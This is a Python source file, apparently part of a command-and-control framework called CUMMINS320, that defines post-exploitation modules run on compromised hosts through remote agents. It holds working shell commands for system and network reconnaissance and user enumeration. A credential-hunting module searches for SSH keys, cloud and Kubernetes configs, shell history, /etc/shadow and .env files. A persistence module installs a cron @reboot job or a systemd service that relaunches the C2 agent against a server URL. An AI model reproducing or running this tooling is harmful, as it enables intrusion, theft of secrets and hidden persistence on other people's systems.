"""CUMMINS320 — Recon Module System

Each module follows the same contract:
  - build_command(args) → str      Shell command the agent runs
  - parse_output(raw)  → dict      Structured result stored in ReconSnapshot
  - diff_snapshots(a, b) → dict    What changed between two runs

Modules:
  sysinfo        Full OS fingerprint
  network_enum   Interfaces, routes, ARP, open ports, connections
  process_list   Running processes, flag interesting ones
  cred_hunt      .env, SSH keys, history, AWS/kube/docker creds, shadow
  user_enum      /etc/passwd, groups, sudo, last logins
  sched_tasks    Cron, systemd timers, at jobs
  persist        (write) — add cron/systemd entry for agent restart
"""

from __future__ import annotations

import json
import re
from abc import ABC, abstractmethod
from contextlib import suppress
from datetime import datetime, timezone
from typing import Any, Optional

from models import Agent, ReconSnapshot, Event, EventSeverity


# ── Base Contract ─────────────────────────────────────────────────────────────

class ArgDef:
    def __init__(self, name: str, description: str, default: Any = None, required: bool = False):
        self.name        = name
        self.description = description
        self.default     = default
        self.required    = required


class ReconModule(ABC):
    name:        str
    description: str
    args:        list[ArgDef] = []
    priority:    int = 5    # 1=critical, 5=normal, 10=background

    @abstractmethod
    def build_command(self, args: dict) -> str:
        """Return the shell command the agent should execute."""

    @abstractmethod
    def parse_output(self, raw_stdout: str, raw_stderr: str) -> dict:
        """Parse raw output into structured JSON-serializable dict."""

    def diff(self, old: dict, new: dict) -> dict:
        """Default diff: compare top-level keys and detect changes."""
        added   = {k: v for k, v in new.items() if k not in old}
        removed = {k: v for k, v in old.items() if k not in new}
        changed = {
            k: {"from": old[k], "to": new[k]}
            for k in old if k in new and old[k] != new[k]
        }
        return {"added": added, "removed": removed, "changed": changed}


# ── Modules ───────────────────────────────────────────────────────────────────

class SysinfoModule(ReconModule):
    name        = "sysinfo"
    description = "Full OS fingerprint: hostname, users, kernel, uptime, memory, disk"
    priority    = 4

    def build_command(self, args: dict) -> str:
        return (
            "echo '=HOSTNAME=' && hostname && "
            "echo '=WHOAMI=' && whoami && "
            "echo '=ID=' && id && "
            "echo '=OS=' && cat /etc/os-release 2>/dev/null || uname -a && "
            "echo '=KERNEL=' && uname -r && "
            "echo '=ARCH=' && uname -m && "
            "echo '=UPTIME=' && uptime && "
            "echo '=MEM=' && free -h 2>/dev/null || vm_stat 2>/dev/null && "
            "echo '=DISK=' && df -h / 2>/dev/null && "
            "echo '=ENV=' && env | grep -v 'TOKEN\\|SECRET\\|PASSWORD\\|KEY' | head -30 && "
            "echo '=INTERFACES=' && ip addr 2>/dev/null || ifconfig 2>/dev/null | head -40"
        )

    def parse_output(self, raw: str, stderr: str) -> dict:
        sections = {}
        current  = None
        for line in raw.splitlines():
            if line.startswith("=") and line.endswith("="):
                current = line.strip("=").lower()
                sections[current] = []
            elif current:
                sections[current].append(line)
        return {k: "\n".join(v).strip() for k, v in sections.items()}


class NetworkEnumModule(ReconModule):
    name        = "network_enum"
    description = "Network interfaces, routes, ARP cache, open ports, active connections"
    priority    = 4

    def build_command(self, args: dict) -> str:
        return (
            "echo '=INTERFACES=' && ip addr 2>/dev/null || ifconfig && "
            "echo '=ROUTES=' && ip route 2>/dev/null || route -n && "
            "echo '=ARP=' && arp -an 2>/dev/null || ip neigh && "
            "echo '=LISTENERS=' && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null && "
            "echo '=CONNECTIONS=' && ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null && "
            "echo '=DNS=' && cat /etc/resolv.conf && "
            "echo '=HOSTS=' && cat /etc/hosts"
        )

    def parse_output(self, raw: str, stderr: str) -> dict:
        sections = {}
        current  = None
        for line in raw.splitlines():
            if line.startswith("=") and line.endswith("="):
                current = line.strip("=").lower()
                sections[current] = []
            elif current:
                sections[current].append(line)

        result = {k: "\n".join(v).strip() for k, v in sections.items()}

        # Extract listener ports as structured list
        listeners = []
        for line in sections.get("listeners", []):
            m = re.search(r":(\d+)\s.*LISTEN", line)
            if m:
                listeners.append(int(m.group(1)))
        result["open_ports"] = sorted(set(listeners))
        return result


class ProcessListModule(ReconModule):
    name        = "process_list"
    description = "Running processes — flags interesting ones (netcat, docker, SSH, DBs)"
    priority    = 5

    INTERESTING = [
        "nc", "ncat", "netcat", "bash -i", "python -c", "perl -e",
        "socat", "ssh", "sshd", "docker", "mysqld", "postgres",
        "redis", "mongodb", "nginx", "apache", "httpd", "python3 -m http",
        "metasploit", "empire", "cobalt", "burp", "nmap",
    ]

    def build_command(self, args: dict) -> str:
        return "ps auxf 2>/dev/null || ps aux"

    def parse_output(self, raw: str, stderr: str) -> dict:
        lines     = raw.splitlines()
        header    = lines[0] if lines else ""
        procs     = lines[1:]
        flagged   = []
        for line in procs:
            for keyword in self.INTERESTING:
                if keyword.lower() in line.lower():
                    flagged.append({"keyword": keyword, "line": line.strip()})
                    break
        return {
            "total_processes": len(procs),
            "flagged": flagged,
            "raw": raw[:20000],
        }


class CredHuntModule(ReconModule):
    name        = "cred_hunt"
    description = "Hunt for credentials: .env, SSH keys, history, AWS/kube/cloud configs"
    priority    = 3   # high priority

    TARGETS = [
        "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
        "~/.ssh/authorized_keys", "~/.ssh/known_hosts",
        "~/.aws/credentials", "~/.aws/config",
        "~/.kube/config",
        "~/.docker/config.json",
        "~/.netrc",
        "~/.pgpass",
        "~/.bash_history", "~/.zsh_history", "~/.fish/fish_history",
        "/etc/shadow",
        "/etc/passwd",
    ]

    def build_command(self, args: dict) -> str:
        search_root = args.get("search_root", "~")
        cmds = []

        # Specific high-value files
        for f in self.TARGETS:
            cmds.append(
                f"echo '=FILE:{f}=' && "
                f"(test -r {f} && wc -c {f} || echo 'NOT_READABLE') 2>/dev/null"
            )

        # .env files in search_root (not too deep)
        cmds.append(
            f"echo '=ENV_FILES=' && "
            f"find {search_root} -maxdepth 6 -name '*.env' -o -name '.env' "
            f"-o -name 'config.py' -o -name 'secrets.py' "
            f"-o -name '*.conf' -path '*/creds*' 2>/dev/null | head -30"
        )

        # Grep for common secret patterns (brief — don't flood output)
        cmds.append(
            f"echo '=GREP_SECRETS=' && "
            f"grep -rl 'password\\|secret\\|api_key\\|token\\|passwd' "
            f"{search_root} --include='*.env' --include='*.conf' "
            f"--include='*.ini' --include='*.json' "
            f"-l 2>/dev/null | head -20"
        )

        return " && ".join(cmds)

    def parse_output(self, raw: str, stderr: str) -> dict:
        sections  = {}
        current   = None
        findings  = []

        for line in raw.splitlines():
            if line.startswith("=FILE:") and line.endswith("="):
                current = line.strip("=").removeprefix("FILE:")
                sections[current] = []
            elif line.startswith("=") and line.endswith("="):
                current = line.strip("=").lower()
                sections[current] = []
            elif current:
                sections[current].append(line)

        # Flag which sensitive files are readable
        for path in self.TARGETS:
            content = sections.get(path, ["NOT_READABLE"])
            readable = "NOT_READABLE" not in " ".join(content)
            if readable:
                findings.append({
                    "type":     "readable_sensitive_file",
                    "path":     path,
                    "severity": "high" if any(x in path for x in ["shadow","id_rsa","id_ed25519","credentials"]) else "medium",
                })

        env_files = [l for l in sections.get("env_files", []) if l.strip()]
        secret_files = [l for l in sections.get("grep_secrets", []) if l.strip()]

        for f in env_files:
            findings.append({"type": "env_file_found", "path": f.strip(), "severity": "high"})
        for f in secret_files:
            findings.append({"type": "secret_pattern_match", "path": f.strip(), "severity": "medium"})

        return {
            "findings":     findings,
            "total_hits":   len(findings),
            "env_files":    env_files,
            "secret_files": secret_files,
            "raw":          raw[:20000],
        }


class UserEnumModule(ReconModule):
    name        = "user_enum"
    description = "Users, groups, sudo access, last logins, SSH authorized keys"
    priority    = 4

    def build_command(self, args: dict) -> str:
        return (
            "echo '=PASSWD=' && cat /etc/passwd && "
            "echo '=GROUPS=' && cat /etc/group && "
            "echo '=SUDO=' && sudo -l 2>&1 && "
            "echo '=LASTLOG=' && lastlog 2>/dev/null | grep -v 'Never' | head -20 && "
            "echo '=WHO=' && who && w 2>/dev/null && "
            "echo '=LOGGED_IN=' && users && "
            "echo '=SUDOERS_D=' && ls /etc/sudoers.d/ 2>/dev/null && "
            "echo '=SSH_AUTHORIZED=' && for h in $(cut -d: -f6 /etc/passwd); do "
            "test -f $h/.ssh/authorized_keys && echo \"$h:\" && cat $h/.ssh/authorized_keys 2>/dev/null; done"
        )

    def parse_output(self, raw: str, stderr: str) -> dict:
        sections = {}
        current  = None
        for line in raw.splitlines():
            if line.startswith("=") and line.endswith("="):
                current = line.strip("=").lower()
                sections[current] = []
            elif current:
                sections[current].append(line)

        # Extract useful user info
        users = []
        for line in sections.get("passwd", []):
            parts = line.split(":")
            if len(parts) >= 7:
                uid = int(parts[2]) if parts[2].isdigit() else -1
                users.append({
                    "username": parts[0],
                    "uid":      uid,
                    "gid":      parts[3],
                    "home":     parts[5],
                    "shell":    parts[6],
                    "is_root":  uid == 0,
                    "has_shell": parts[6] not in ("/bin/false", "/sbin/nologin", "/usr/sbin/nologin"),
                })

        sudo_nopasswd = "NOPASSWD" in "\n".join(sections.get("sudo", []))

        return {
            "users":         users,
            "sudo_nopasswd": sudo_nopasswd,
            "sudo_raw":      "\n".join(sections.get("sudo", [])),
            "who":           "\n".join(sections.get("who", [])),
            "authorized_keys": "\n".join(sections.get("ssh_authorized", [])),
            "raw":           raw[:20000],
        }


class SchedTasksModule(ReconModule):
    name        = "sched_tasks"
    description = "Cron jobs, systemd timers, at jobs — find persistence points"
    priority    = 5

    def build_command(self, args: dict) -> str:
        return (
            "echo '=CRON_SYSTEM=' && cat /etc/crontab 2>/dev/null && "
            "echo '=CRON_D=' && ls /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null && "
            "echo '=CRON_USERS=' && for u in $(cut -d: -f1 /etc/passwd); do "
            "crontab -l -u $u 2>/dev/null | grep -v '^#' | grep -v '^$' "
            "| awk -v user=$u '{print user\": \"$0}'; done && "
            "echo '=SYSTEMD_TIMERS=' && systemctl list-timers --all 2>/dev/null | head -40 && "
            "echo '=AT_JOBS=' && atq 2>/dev/null"
        )

    def parse_output(self, raw: str, stderr: str) -> dict:
        sections = {}
        current  = None
        for line in raw.splitlines():
            if line.startswith("=") and line.endswith("="):
                current = line.strip("=").lower()
                sections[current] = []
            elif current:
                sections[current].append(line)

        cron_entries = []
        for src in ("cron_system", "cron_d", "cron_users"):
            for line in sections.get(src, []):
                line = line.strip()
                if line and not line.startswith("#"):
                    cron_entries.append({"source": src, "entry": line})

        return {
            "cron_entries":    cron_entries,
            "total_cron":      len(cron_entries),
            "systemd_timers":  "\n".join(sections.get("systemd_timers", [])),
            "at_jobs":         "\n".join(sections.get("at_jobs", [])),
        }


class PersistModule(ReconModule):
    name        = "persist"
    description = "Install agent persistence via cron or systemd user service"
    priority    = 1   # critical

    args = [
        ArgDef("method",     "cron or systemd",        default="cron"),
        ArgDef("server_url", "C2 server URL",          required=True),
        ArgDef("agent_path", "Path to agent.py",       default="~/.c2/agent.py"),
    ]

    def build_command(self, args: dict) -> str:
        method     = args.get("method", "cron")
        server_url = args.get("server_url", "http://100.64.0.10:8080")
        agent_path = args.get("agent_path", "~/.c2/agent.py")

        if method == "systemd":
            return (
                f"mkdir -p ~/.config/systemd/user && "
                f"cat > ~/.config/systemd/user/c2-agent.service << 'EOF'\n"
                f"[Unit]\nDescription=C2 Agent\nAfter=network.target\n"
                f"[Service]\nExecStart=/usr/bin/python3 {agent_path} --server {server_url}\n"
                f"Restart=always\nRestartSec=30\n"
                f"[Install]\nWantedBy=default.target\nEOF\n"
                f"systemctl --user daemon-reload && "
                f"systemctl --user enable --now c2-agent && "
                f"echo 'Persisted via systemd'"
            )
        else:
            return (
                f"(crontab -l 2>/dev/null; echo "
                f"'@reboot /usr/bin/python3 {agent_path} --server {server_url} &') "
                f"| crontab - && "
                f"echo 'Persisted via cron @reboot'"
            )

    def parse_output(self, raw: str, stderr: str) -> dict:
        success = "Persisted" in raw and not stderr
        return {
            "success":  success,
            "method":   "detected from output",
            "output":   raw.strip(),
            "errors":   stderr.strip(),
        }


# ── Registry ──────────────────────────────────────────────────────────────────

class ModuleRegistry:
    """Central registry. Modules are looked up by name and dispatched as tasks."""

    _modules: dict[str, ReconModule] = {}

    @classmethod
    def register(cls, module: ReconModule):
        cls._modules[module.name] = module

    @classmethod
    def get(cls, name: str) -> Optional[ReconModule]:
        return cls._modules.get(name)

    @classmethod
    def all(cls) -> list[ReconModule]:
        return list(cls._modules.values())

    @classmethod
    def dispatch(
        cls,
        module_name: str,
        agent_id:    str,
        args:        dict,
        task_queue,
        operator:    str = "admin",
    ):
        """Build the shell command and enqueue it as a task."""
        mod = cls.get(module_name)
        if not mod:
            raise ValueError(f"Unknown module: {module_name}")
        cmd  = mod.build_command(args)
        task = task_queue.submit_shell(
            agent_id = agent_id,
            command  = cmd,
            priority = mod.priority,
            operator = operator,
        )
        return task

    @classmethod
    def save_snapshot(
        cls,
        db,
        module_name: str,
        agent_id:    str,
        raw_stdout:  str,
        raw_stderr:  str,
    ) -> ReconSnapshot:
        """Parse output and persist a ReconSnapshot."""
        mod = cls.get(module_name)
        if not mod:
            raise ValueError(f"Unknown module: {module_name}")
        parsed = mod.parse_output(raw_stdout, raw_stderr)
        snap   = ReconSnapshot(
            agent_id   = agent_id,
            module     = module_name,
            data       = parsed,
            raw_output = raw_stdout[:50000],
        )
        db.add(snap)
        db.commit()
        db.refresh(snap)
        return snap

    @classmethod
    def diff_snapshots(cls, snap_a: ReconSnapshot, snap_b: ReconSnapshot) -> dict:
        """Compare two snapshots of the same module type."""
        if snap_a.module != snap_b.module:
            raise ValueError("Cannot diff different module types")
        mod = cls.get(snap_a.module)
        if not mod:
            return {}
        return mod.diff(snap_a.data or {}, snap_b.data or {})


# ── Auto-register all modules ─────────────────────────────────────────────────

for _mod in [
    SysinfoModule(),
    NetworkEnumModule(),
    ProcessListModule(),
    CredHuntModule(),
    UserEnumModule(),
    SchedTasksModule(),
    PersistModule(),
]:
    ModuleRegistry.register(_mod)
